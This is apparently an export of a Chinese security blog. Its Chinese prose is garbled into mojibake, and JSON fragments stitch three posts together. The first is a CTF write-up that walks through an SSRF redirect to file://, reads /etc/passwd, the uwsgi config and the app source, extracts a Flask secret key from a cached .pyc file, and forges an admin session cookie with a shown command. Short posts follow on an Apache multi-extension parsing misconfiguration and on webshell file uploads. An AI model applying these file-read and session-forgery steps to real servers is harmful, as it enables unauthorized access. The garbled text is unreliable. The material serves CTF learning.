æ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªæœåŠ¡ï¼Œå¹¶è¾“å…¥å‚æ•°?wells=file:///etc/passwd,å‘ç°é¡µé¢è¿”å›å‡ºæ¥äº†passwdçš„æ–‡ä»¶å†…å®¹ content:root:x:0:0:root:/root:/bin/ash\\ .........,online:true,success:true æ­¤æ—¶å†æ¬¡åˆ©ç”¨/procç›®å½•è¿›è¡Œå°è¯•æ‰¾åˆ°åç«¯æœåŠ¡çš„æ–‡ä»¶å¤¹ä½ç½®ä»¥åŠæ‰€å¯¹åº”çš„è¿è¡Œç¨‹åº åœ¨/proc/1/cmdlineå°è¯•è¯»å–åç«¯çš„è¿è¡Œç¨‹åºçš„ç›¸å…³ä¿¡æ¯uwsgi\\\\x00--ini\\\\x00/etc/uwsgi/uwsgi-custom.ini\\\\x00ï¼Œå¯ä»¥çŒœåˆ°æ­¤æ—¶çš„åç«¯åº”è¯¥æ˜¯flaskï¼Œç„¶åå†é¡ºè—¤æ‘¸ç“œè¿›å…¥åˆ°/etc/uwsgi/uwsgi-custom.iniè¯»å–é…ç½®ä¿¡æ¯ï¼šï¼ˆç¾åŒ–åï¼‰ [uwsgi]uid = www-datagid = www-datamaster = trueprocesses = 4http-socket = 0.0.0.0:5000chmod-sock = 664vacuum = truedie-on-term = truewsgi-file = /var/www/keep-dreaming-sonny-boy/app.pycallable = apppythonpath = /usr/local/lib/python3.11/site-packages æ¯”è¾ƒé‡è¦çš„ä¿¡æ¯æ˜¯ï¼šwsgi-file = /var/www/keep-dreaming-sonny-boy/app.pyï¼Œç„¶åç»§ç»­é¡ºè—¤æ‘¸ç“œæ‰¾åˆ°å¯¹åº”çš„åç«¯æ–‡ä»¶è¯»å‡ºå‡ºæ¥ï¼Œå› ä¸ºç»è¿‡äº†jsonçš„è½¬åŒ–ï¼Œå˜å¾—æ— æ•Œéš¾çœ‹ï¼Œè®©ç‹—å±é€šç¾åŒ–ä¸€ä¸‹æœ€åå¾—åˆ° from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocess, osdef protect_secrets(): os.unlink(config.py)def check_url(url): if not isinstance(url, str) or len(url) == 0: return False, Please provide a regular url! if not url.startswith(https://) or url.lstrip() != url: return False, Url must start with https://. We do not want anything insecure here! return True, app = Flask(__name__, static_folder=static, static_url_path=/assets/)app.secret_key = session_encryption_keyprint(Using key: , app.secret_key)protect_secrets()@app.route(/, methods=[GET])def home(): return send_from_directory(pages, index.html)@app.route(/flag, methods=[GET])def healthcheck(): if session.get(admin) == True: # return subprocess.check_output(/readflag) else: return abort(403)@app.route(/check, methods=[POST])def check(): url = request.form.get(url) valid, err = check_url(url) if not valid: return success: False, error: err if True: content = fetch(url) return success: True, online: content != None, content: content if __name__ == __main__: app.run(host=0.0.0.0, port=10600, debug=False) ä½†æ˜¯è¿™é‡Œé¢requestlibåº“æ–‡ä»¶æ˜¯æˆ‘ä»¬å®‰è£…ä¸äº†çš„ï¼Œå°è¯•ç›´æ¥è¯»å–ä¸€ä¸‹requestlib.pyæŸ¥çœ‹æ˜¯ä¸æ˜¯è‡ªå·±å†™çš„åº“ï¼ŒåŒæ ·çš„ä¹Ÿæ˜¯è¯»åˆ°äº†è¿™ä¸ªæ–‡ä»¶ï¼Œç»è¿‡ç¾åŒ–åå¦‚ä¸‹ï¼š from urllib.request import urlopen, HTTPErrorProcessor, build_opener, Requestimport urllibclass NoRedirection(HTTPErrorProcessor): def http_response(self, request, response): return response https_response = http_responseinstall_opener(build_opener(NoRedirection()))def fetch(url, follow_redirects=True): Avoid endless redirect loops headers = User-Agent: requestlib 2.9-alpha req = Request(url, headers=headers) with urlopen(req) as res: redirect_url = res.headers.get(Location)) if redirect_url and follow_redirects: return fetch(redirect_url, follow_redirects=False) return str(res.read())[2:-1] æ¼æ´æˆå› åœ¨å®šä¹‰çš„fetchå‡½æ•°ä¸­follow_redirectså€¼é»˜è®¤ä¸ºTrueï¼Œå¹¶ä¸”è·Ÿéšå“åº”åŒ…ä¸­çš„Locationé”®å€¼è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨é‡å®šå‘ï¼Œé‡å®šå‘çš„ç›®æ ‡æ˜¯ä½•ã€‚ä½†ç”±äºåªé™åˆ¶äº†ç¬¬ä¸€æ¬¡è¾“å…¥çš„ç½‘å€ä¸ºhttps://,å¹¶æœªè¿›è¡Œå¯¹é‡å®šå‘çš„åè®®è¿›è¡Œæ£€æŸ¥ä»è€Œé€ æˆäº†SSRF å¦‚ä½•å¤„ç†é‡å®šå‘ æ³¨æ„ï¼š å¦‚æµè§ˆå™¨ï¼Œpowershellä¸­çš„curlå†å¤„ç†é‡å®šå‘æ—¶ï¼Œæ— æ³•å¤„ç†ä»https://é‡å®šå‘è‡³file:// powershellä¸­çš„curlå‘ç”ŸæŠ¥é”™ æµè§ˆå™¨ä¼šæç¤ºé¡µé¢é”™è¯¯ åšåˆ°è¿™é‡Œï¼Œå…³é”®å…¶å®æ˜¯ä¸ºé€ å‡ºä¸€ä¸ªsessionï¼Œå…¶é”®å€¼å­˜åœ¨admin: True,ä½†å­˜æœ‰session_encryption_keyçš„config.pyå†è¢«è°ƒç”¨åå°±è¢«åˆ é™¤äº†,éœ€è¦æ‰¾åˆ°å¦‚ä½•å¤åŸçš„åŠæ³• @app.route(/flag, methods=[GET])def healthcheck(): if session.get(admin) == True: # return subprocess.check_output(/readflag) else: return abort(403) __pycache__æ–‡ä»¶å¤¹ åœ¨Pythonå·¥ä½œç›®å½•ä¸‹ï¼Œå¦‚æœæ‰§è¡ŒæŸæ–‡ä»¶åç»å¸¸ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª__pycache__æ–‡ä»¶å¤¹ã€‚__pycache__æ–‡ä»¶å¤¹æ­£æ˜¯ç¼“å­˜*.pycåœ°æ–¹ã€‚*.pycæ–‡ä»¶çš„å‘½åæ ¼å¼æ˜¯module.interpreter_version.pycã€‚æ³¨æ„ï¼Œå¯¹äºè¢«å¯¼å…¥ï¼ˆimportï¼‰çš„moduleæ‰ä¼šç”Ÿæˆå¯¹åº”çš„*.pycæ–‡ä»¶ è¯¦ç»†æ–‡æ¡£å¯å‚è€ƒï¼š ã€Pythonã€‘__pycache__æ–‡ä»¶å¤¹æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿ - çŸ¥ä¹ (zhihu.com) pyhtonä¸­__pycache__æ–‡ä»¶å¤¹çš„äº§ç”Ÿä¸ä½œç”¨_pycacheæ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿æ˜¯å¦‚ä½•äº§ç”Ÿçš„-CSDNåšå®¢ ä¾‹å­ï¼š ä»¥è¢«å¯¼å…¥çš„ä¸ºconfig.pyæ–‡ä»¶ä¸ºä¾‹ï¼Œæœ€åç”Ÿæˆåœ¨__pycache__æ–‡ä»¶å¤¹config.cpython-35.pycï¼Œæœ€å¼€å§‹çš„configä¸ºè¢«å¯¼å…¥çš„æ–‡ä»¶åï¼Œcpythonä»£è¡¨çš„æ˜¯cè¯­è¨€å®ç°çš„Pythonè§£é‡Šå™¨ï¼Œ-35ä»£è¡¨çš„æ˜¯ç‰ˆæœ¬ä¸º3.5ç‰ˆã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨__pycache__æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°configçš„.pycæ–‡ä»¶ï¼Œå†è¿›è¡Œé€†å‘ æœ€åæµ‹è¯•åˆ°è·¯å¾„ä¸ºï¼š/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pycï¼Œé‡Œé¢çš„å†…å®¹ä¸ºï¼š \\\\xa7\\\\r\\\\r\\ \\\\x00\\\\x00\\\\x00\\\\x00\\\\x86\\\\x84\\\\xf7e;\\\\x00\\\\x00\\\\x00\\\\xe3\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf3\\ \\\\x00\\\\x00\\\\x00\\\\x97\\\\x00d\\\\x00Z\\\\x00d\\\\x01S\\\\x00)\\\\x02\\\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\\\x01\\\\xda\\\\x16session_encryption_key\\\\xa9\\\\x00\\\\xf3\\\\x00\\\\x00\\\\x00\\\\x00\\\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\\\xfa\\\\x08moduler\\\\x07\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00s\\\\x11\\\\x00\\\\x00\\\\x00\\\\xf0\\\\x03\\\\x01\\\\x01\\\\x01\\\\xd8\\\\x19;\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16r\\\\x05\\\\x00\\\\x00\\\\x00 ç”±äºè½¬åŒ–ä¸ºjsonåè½¬ä¹‰å­—ç¬¦\\ä¼šå˜æˆ\\\\,å«ç‹—å±é€šå†™ä¸€ä¸ªå°å°çš„è„šæœ¬æŠŠä»¥ä¸Šæ•°æ®æ¢å¤æˆäºŒè¿›åˆ¶æ•°æ® data_str = \\\\xa7\\\\r\\\\r\\ \\\\x00\\\\x00\\\\x00\\\\x00\\\\x86\\\\x84\\\\xf7e;\\\\x00\\\\x00\\\\x00\\\\xe3\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf3\\ \\\\x00\\\\x00\\\\x00\\\\x97\\\\x00d\\\\x00Z\\\\x00d\\\\x01S\\\\x00)\\\\x02\\\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\\\x01\\\\xda\\\\x16session_encryption_key\\\\xa9\\\\x00\\\\xf3\\\\x00\\\\x00\\\\x00\\\\x00\\\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\\\xfa\\\\x08moduler\\\\x07\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00s\\\\x11\\\\x00\\\\x00\\\\x00\\\\xf0\\\\x03\\\\x01\\\\x01\\\\x01\\\\xd8\\\\x19;\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16r\\\\x05\\\\x00\\\\x00\\\\x00# å°†å­—ç¬¦ä¸²ä¸­çš„è½¬ä¹‰åºåˆ—è½¬æ¢ä¸ºç›¸åº”çš„äºŒè¿›åˆ¶æ•°æ®binary_data = bytes(data_str, utf-8).decode(unicode_escape).encode(latin1)# ä¿å­˜åˆ°æ–‡ä»¶with open(output_binary_data.txt, wb) as file: file.write(binary_data) .pycæ–‡ä»¶çš„é€†å‘åœ¨ç½‘ä¸Šå°±å¾ˆå¤šåœ¨çº¿çš„å·¥å…·å¯ä»¥è¿›è¡Œä½¿ç”¨ï¼Œé€†å‘åå¾—åˆ° #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11session_encryption_key = Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL å†ä½¿ç”¨sessionä¼ªé€ å·¥å…·flask-session-cookie-managerä¸ºé€ å‡ºä¸€ä¸ªsessionå‡ºæ¥ï¼ŒæŒ‡ä»¤ä¸ºï¼š python flask_session_cookie_manager3.py encode -s Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL -t admin:True æœ€åå¾—åˆ°ä¼ªé€ çš„sessionæ‰€å¯¹åº”çš„cookieä¸ºï¼šeyJhZG1pbiI6dHJ1ZX0.ZgBMeg.t2OWSLBvEeZpMPUZNBFFcmsFS-oï¼Œæ‰‹åŠ¨å¡«å…¥æµè§ˆå™¨ä¸­ï¼Œå¹¶è®¿é—®flag æœ€åå¾—åˆ°flagï¼škalmarRem3Mbr_T0_fl0sh! æŸ¥çœ‹Wellsçš„ä¸¢äººè¿‡ç¨‹ æˆ‘æƒ³ç€ä¸æ˜¯ä¼ªé€ å‡ºsessionæœ€åçš„ç»“æœæ—¶è¿è¡Œ/readflagè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¾¿å°è¯•è¯»å–äº†ä¸€ä¸‹ï¼Œè½¬åŒ–ä¸ºäºŒè¿›åˆ¶ï¼Œå†å‘ç»™é€†å‘çš„åŒå­¦çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾å‡ºflagä½äºå“ªé‡Œå‘½åä¸ºä»€ä¹ˆç›´æ¥è¯»å–å‡ºæ¥ ä¹Ÿç¡®å®é€†å‘å‡ºæ¥ï¼Œæ‰¾åˆ°äº†flagçš„ä½ç½®ä»¥åŠåç§° ä½†å‡ºé¢˜äººä¹Ÿä¼°è®¡æƒ³åˆ°äº†è¿™ä¸€ç‚¹ï¼Œä½äºflag.txtè®¾ç½®äº†æƒé™ï¼Œæ²¡æ³•è¢«ç›´æ¥è¯»å–å‡ºæ¥ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ è·ªè°¢é€†å‘çš„åŒå­¦ï¼šL0SJ0K","tags":["CTF-WriteUp"],"categories":["WriteUp"]},{"title":"ä¸­é—´ä»¶æ¼æ´","path":"/posts/895d3c4b/","content":"Apache2.0-2.2ç‰ˆæœ¬å­˜åœ¨ä¸ªæ¼æ´ CE-2012-0053: æ”»å‡»è€…å¯é€šè¿‡å‘ç½‘ç«™æ¤äººè¶…å¤§çš„Cookie,ä»¤å…¶HTTPå¤´è¶…è¿‡Apacheçš„LititRequestFieldSize (æœ€å¤§è¯·æ±‚é•¿åº¦ï¼Œ4192å­—èŠ‚)ï¼Œä½¿å¾—Apacheè¿”å›400é”™è¯¯ï¼ŒçŠ¶æ€é¡µä¸­åŒ…å«äº†HttpOnly ä¿æŠ¤çš„Cookieã€‚ core - Apache HTTP Server ç‰ˆæœ¬ 2.4 Apacheè§£æé…ç½®æ¼æ´\\å¤šåç¼€åè§£æé…ç½®æ¼æ´è§£æé…ç½®æ¼æ´ç®€ä»‹æ­¤æ¼æ´å®é™…ä¸ºäººä¸ºçš„é”™è¯¯é…ç½®å¯¼è‡´çš„æ¼æ´ï¼Œä¸Apacheæœ¬èº«æ— å…³ã€‚ Apacheå¯¹äºå¤šåç¼€æ–‡ä»¶çš„å¤„ç†è§„åˆ™æ˜¯ï¼šFiles with Multiple Extensions-mod_mime å…ƒæ•°æ®æŒ‡æ‰©å±•åæ˜ å°„åˆ°å…³äºè¯­è¨€ã€å†…å®¹ç±»å‹ã€å­—ç¬¦é›†æˆ–ç¼–ç çš„ä¿¡æ¯ åŸæ–‡ï¼š metadata (language, content type, character set or encoding) æ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªæ‰©å±•åï¼›æ‰©å±•åçš„é¡ºåºé€šå¸¸æ˜¯æ— å…³ç´§è¦çš„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ–‡ä»¶ welcome.html.fr æ˜ å°„åˆ°å†…å®¹ç±»å‹ texthtml å’Œæ³•è¯­ï¼Œåˆ™æ–‡ä»¶ welcome.fr.html ä¼šæ˜ å°„åˆ°å®Œå…¨ç›¸åŒçš„ä¿¡æ¯ã€‚å¦‚æœç»™å‡ºäº†å¤šä¸ªæ˜ å°„åˆ°ç›¸åŒç±»å‹å…ƒæ•°æ®çš„æ‰©å±•åï¼Œåˆ™å³è¾¹çš„æ‰©å±•åå°†è¢«ä½¿ç”¨ï¼Œè¯­è¨€å’Œå†…å®¹ç¼–ç é™¤å¤–ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ .gif æ˜ å°„åˆ°åª’ä½“ç±»å‹ imagegifï¼Œè€Œ .html æ˜ å°„åˆ°åª’ä½“ç±»å‹ texthtmlï¼Œåˆ™æ–‡ä»¶ welcome.gif.html å°†ä¸åª’ä½“ç±»å‹ texthtml å…³è”ã€‚ è¯­è¨€å’Œå†…å®¹ç¼–ç è¢«è§†ä¸ºç´¯ç§¯çš„ï¼Œå› ä¸ºå¯ä»¥ä¸ºç‰¹å®šèµ„æºåˆ†é…ä¸æ­¢ä¸€ç§è¯­è¨€æˆ–ç¼–ç ã€‚ä¾‹å¦‚ï¼Œæ–‡ä»¶ welcome.html.en.de å°†ä»¥ Content-Language: en, de å’Œ Content-Type: texthtml äº¤ä»˜ã€‚ å½“ä¸€ä¸ªå…·æœ‰å¤šä¸ªæ‰©å±•åçš„æ–‡ä»¶åŒæ—¶ä¸åª’ä½“ç±»å‹å’Œå¤„ç†ç¨‹åºå…³è”æ—¶ï¼Œåº”è¯¥å°å¿ƒå¤„ç†ã€‚è¿™é€šå¸¸ä¼šå¯¼è‡´è¯·æ±‚ç”±ä¸å¤„ç†ç¨‹åºå…³è”çš„æ¨¡å—å¤„ç†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ .imap æ‰©å±•åæ˜ å°„åˆ°å¤„ç†ç¨‹åº imap-fileï¼ˆæ¥è‡ª mod_imagemapï¼‰ï¼Œè€Œ .html æ‰©å±•åæ˜ å°„åˆ°åª’ä½“ç±»å‹ texthtmlï¼Œåˆ™æ–‡ä»¶ world.imap.html å°†åŒæ—¶ä¸ imap-file å¤„ç†ç¨‹åºå’Œ texthtml åª’ä½“ç±»å‹å…³è”ã€‚å¤„ç†æ—¶ï¼Œå°†ä½¿ç”¨ imap-file å¤„ç†ç¨‹åºï¼Œå› æ­¤å®ƒå°†è¢«è§†ä¸ºä¸€ä¸ª mod_imagemap å›¾åƒæ˜ å°„æ–‡ä»¶ã€‚ å¦‚æœä½ å¸Œæœ›åªæœ‰æ–‡ä»¶åä¸­æœ€åä¸€ä¸ªç‚¹åˆ†éš”çš„éƒ¨åˆ†æ˜ å°„åˆ°ç‰¹å®šçš„å…ƒæ•°æ®ï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨ Add* æŒ‡ä»¤ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ å¸Œæœ›æ–‡ä»¶ foo.html.cgi è¢«å¤„ç†ä¸º CGI è„šæœ¬ï¼Œä½†ä¸å¸Œæœ›æ–‡ä»¶ bar.cgi.html å¦‚æ­¤å¤„ç†ï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨ AddHandler cgi-script .cgiï¼Œè€Œæ˜¯ä½¿ç”¨ ä»…åŸºäºæœ€ç»ˆæ‰©å±•åSetHandleré…ç½®å¤„ç†ç¨‹åº FilesMatch [^.]+\\.cgi$ SetHandler cgi-script/FilesMatch Apacheå¯¹å¤šåç¼€æ–‡ä»¶çš„è¯†åˆ«æ¦‚æ‹¬æ¥è¯´ä¸ºï¼š Apacheå…è®¸æ–‡ä»¶æœ‰å¤šä¸ªæ‰©å±•åï¼Œå¹¶ä¸”ä¼šå°†æ‰€æœ‰åç¼€åè¿›è¡Œè¯†åˆ«ï¼Œè¯†åˆ«çš„é¡ºåºä¸ºï¼šä»å³åˆ°å·¦ å¦‚ï¼š .html.fr æ˜ å°„åˆ° Content-Type: text/html å’ŒContent-Language: deã€‚ Apacheå…è®¸æ‰©å±•åæ˜ å°„åˆ°å…ƒæ•°æ®(åŒ…æ‹¬ï¼šè¯­è¨€ã€å†…å®¹ç±»å‹ã€å­—ç¬¦é›†æˆ–ç¼–ç )ã€å¤„ç†ç¨‹åºã€‚ å¦‚ .html æ˜ å°„åˆ° Content-Type: text/htmlã€‚ å¯¹äºç›¸åŒç±»å‹å…ƒæ•°æ®ï¼Œä»¥ä»å³åˆ°å·¦ç¬¬ä¸€ä¸ªå‡ºç°çš„ä¸ºå‡†ï¼Œä½†å¯¹äºè¯­è¨€å’Œå†…å®¹ç¼–ç å¯ç´¯ç§¯çš„å…ƒæ•°æ®ï¼Œå°†ä¼šå åŠ ã€‚ å¦‚ï¼š.gif.htmlæ ¹æ®æ­¤è§„åˆ™æ˜ å°„åˆ° Content-Type: text/htmlã€‚ â€‹ .html.en.deæ ¹æ®æ­¤è§„åˆ™æ˜ å°„åˆ°Content-Language: en, de å’Œ Content-Type: text/html ç”±äºæ˜ å°„åˆ°å¤„ç†ç¨‹åºå’Œæ˜ å°„åª’ä½“ç±»å‹ï¼Œæœ€åçš„è¿”å›ç»“æœä¸ä¸€è‡´ï¼ˆä¸€ä¸ªä¸ºç»è¿‡ç¨‹åºå¤„ç†ï¼Œä¸€ä¸ªä¸ºè¿”å›åª’ä½“æ–‡ä»¶ï¼‰ã€‚å½“å‡ºç°ä¸åŒæ‰©å±•åæ˜ å°„åˆ°å¤„ç†ç¨‹åºå’Œåª’ä½“ç±»å‹æ—¶ï¼Œæ˜ å°„åˆ°å¤„ç†ç¨‹åºçš„ä¼˜å…ˆç­‰çº§é«˜äºæ˜ å°„åˆ°åª’ä½“ç±»å‹ å¦‚ï¼š.imap.htmlæ‰©å±•å.imap æ˜ å°„åˆ°å¤„ç†ç¨‹åº imap-fileï¼Œ .html æ˜ å°„åˆ°Content-Type: text/html ï¼Œæ ¹æ®ä¸Šè¿°åŸåˆ™ï¼Œ.imap.htmlæ–‡ä»¶ä¼šè¢«imap-fileç¨‹åºå¤„ç† æŒ‰æˆ‘çš„ç†è§£ï¼šå…ƒæ•°æ®ï¼ˆmetadataï¼‰æ˜¯ç”¨äºæŒ‡ç¤ºæ–‡ä»¶çš„ç±»å‹æˆ–å¤„ç†æ–¹å¼ è¿™é‡Œæˆ‘æŠŠå…ƒæ•°æ®ï¼ˆmetadataï¼‰çš„å®šä¹‰åŒ…æ‹¬äº†å¤„ç†æ–¹å¼ï¼Œæ ¹æ®ä¸€ä¸‹æ®µè½åˆç†çš„è¿›è¡Œæ‹“å±•å®šä¹‰ If you would prefer only the last dot-separated part of the filename to be mapped to a particular piece of meta-data, then do not use the Add* directives. For example, if you wish to have the file foo.html.cgi processed as a CGI script, but not the file bar.cgi.html, then instead of using AddHandler cgi-script .cgi å¦‚æœä½ å¸Œæœ›åªæœ‰æ–‡ä»¶åä¸­æœ€åä¸€ä¸ªç‚¹åˆ†éš”çš„éƒ¨åˆ†æ˜ å°„åˆ°ç‰¹å®šçš„å…ƒæ•°æ®ï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨ Add* æŒ‡ä»¤ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ å¸Œæœ›æ–‡ä»¶ foo.html.cgi è¢«å¤„ç†ä¸º CGI è„šæœ¬ï¼Œä½†ä¸å¸Œæœ›æ–‡ä»¶ bar.cgi.html å¦‚æ­¤å¤„ç†ï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨ AddHandler cgi-script .cgi å› æ­¤å½“å‡ºç°å¤šä¸ªæ˜ å°„åˆ°å¤„ç†ç¨‹åºï¼Œä¼šæŒ‰ç…§ä»å³åˆ°å·¦ç¬¬ä¸€ä¸ªå‡ºç°çš„ä¸ºå‡†ï¼Œè¿›è¡Œå¤„ç†ç¨‹åº ä½¿ç”¨ Add* æŒ‡ä»¤ï¼ŒApacheå¤„ç†ä¸€ä¸ªæ–‡ä»¶æ—¶ä¼šåº”ç”¨ä¸Šè¿°è§„åˆ™ Add* æŒ‡ä»¤æŒ‡çš„æ˜¯å¦‚ï¼šAddTypeã€AddDefaultCharsetã€AddEncodingã€AddHandlerã€AddOutputFilterã€AddLanguageã€AddCharsetç­‰æŒ‡ä»¤ï¼Œå…¶ä¸­AddHandlerè®¾ç½®å¯¹åº”åç¼€åæ˜ å°„åˆ°å¤„ç†ç¨‹åºï¼Œå¦‚ï¼š AddHandler application/x-httpd-php .php ç”±æ­¤ï¼Œå½“ç”¨æˆ·ä¸Šä¼ ä¸€ä¸ªa.php.jpgæ–‡ä»¶æ—¶ï¼ŒApaceçš„é…ç½®æ–‡ä»¶ä¸­åŒ…å«AddHandlerå¤„ç†PHPæ–‡ä»¶ï¼Œä¸”æœªå¯¹ä¸Šä¼ åçš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œæ­¤æ—¶a.php.jpgè¢«è§£æä¸ºä¸€ä¸ªPHPè„šæœ¬ï¼Œè§£ææ¼æ´ç”±æ­¤è€Œæ¥ è§£æé…ç½®æ¼æ´æ¡ä»¶ æ–‡ä»¶æ²¡æœ‰è¢«é‡å‘½å Apacheä¸­é…ç½®ä¸­å«æœ‰AddHandlerçš„è®¾ç½® è§£æé…ç½®æ¼æ´è§£å†³åŠæ³• å°†ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½å æ ¹æ®å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ï¼Œå¯ä»¥ä½¿ç”¨SetHandleræŒ‡ä»¤æ¥ä»£æ›¿AddHandlerï¼Œå› ä¸ºSetHandlerä»…æ ¹æ®æœ€å³ç«¯çš„åç¼€åæ¥åˆ¤æ–­æ˜ å°„çš„å¤„ç†ç¨‹åº","tags":["CTF-Web","Web-Middleware"],"categories":["web"]},{"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","path":"/posts/931c692/","content":"æ¦‚è¿°ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”±äºå¯¹ç”¨æˆ·æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„æ§åˆ¶ä¸è¶³æˆ–è€…å¤„ç†ç¼ºé™·ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥å‘æœåŠ¡å™¨ä¸Šä¼ æ¶æ„æ–‡ä»¶å¹¶è¿›è¡Œæ‰§è¡Œï¼Œåè·å¾—æ‰§è¡ŒæœåŠ¡ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚ äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå›  ä¸å……åˆ†çš„æ–‡ä»¶éªŒè¯ï¼šå¦‚æœåº”ç”¨ç¨‹åºæœªèƒ½æ­£ç¡®éªŒè¯ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ï¼ˆå¦‚MIMEç±»å‹æˆ–æ–‡ä»¶æ‰©å±•åï¼‰å’Œå†…å®¹ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šä¸Šä¼ æ‰§è¡Œæ¶æ„ä»£ç çš„æ–‡ä»¶ã€‚ ä¸å®‰å…¨çš„æ–‡ä»¶å­˜å‚¨ï¼šå¦‚æœä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨å¯é€šè¿‡Webç›´æ¥è®¿é—®çš„ä½ç½®ï¼Œä¸”æ–‡ä»¶åå¯é¢„æµ‹æˆ–æœªç»è¿‡é€‚å½“å¤„ç†ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ‰§è¡Œä¸Šä¼ çš„æ¶æ„æ–‡ä»¶ã€‚ æœªå¯¹æƒé™è¿›è¡Œé™åˆ¶ï¼šæƒé™ä¸Šæ²¡æœ‰å¯¹äºä¸Šä¼ çš„æ–‡ä»¶ç›®å½•è®¾ç½®ä¸å¯æ‰§è¡Œæƒé™ã€‚ ä¾‹å­CTFHUB-æŠ€èƒ½æ ‘-WEB-æ–‡ä»¶ä¸Šä¼ -æ— éªŒè¯ å› ä¸ºåœ¨ä¸Šä¼ æ–‡ä»¶åæ— éªŒè¯æ–‡ä»¶ä¿¡æ¯ä»¥åŠè®¾ç½®åŠ¨æ€è„šæœ¬ä¸å¯è¢«æ‰§è¡Œï¼Œå› æ­¤ä¾¿å¯ç›´æ¥ä¸Šä¼ è¿œç¨‹æœ¨é©¬æ–‡ä»¶ï¼Œ ä¸Šä¼ åè®¿é—®æ­¤ç½‘ç«™è·¯å¾„ä¸‹çš„/upload/shell.phpå‘ç°æ˜¯ç©ºç™½ç•Œé¢ï¼Œè¯´æ˜phpæ–‡ä»¶å¯ä»¥è¢«æ‰§è¡Œï¼Œæ­¤æ—¶é€šè¿‡å†°èè¿›è¡Œè¿œç¨‹è¿æ¥ å‡ºç°phpinfoé¡µé¢ï¼Œè¯´æ˜è¿æ¥æˆåŠŸï¼Œå³å¯è·å¾—ä¸»æœºéƒ¨åˆ†æƒé™ï¼Œè½¬åˆ°å¯¹åº”ç›®å½•è¯»å–flag åç«¯ç»•è¿‡-è§£ææ¼æ´ è§£ææ¼æ´é€šå¸¸æŒ‡çš„æ˜¯å½“åº”ç”¨ç¨‹åºæˆ–æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œç”±äºå¯¹æ–‡ä»¶ç±»å‹çš„è§£æä¸å½“æˆ–ä¸å®‰å…¨ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œä¸å½“æ“ä½œæˆ–è·å–ä¸å½“æƒé™çš„å®‰å…¨é—®é¢˜ã€‚ä¾‹å¦‚å…è®¸ç”¨æˆ·ä¸Šä¼ .htaccessæ–‡ä»¶å¯¼è‡´ç”¨æˆ·å¯ä»¥è®¾ç½®ä»»æ„æ–‡ä»¶æ ¼å¼çš„è§£ææ–¹å¼ 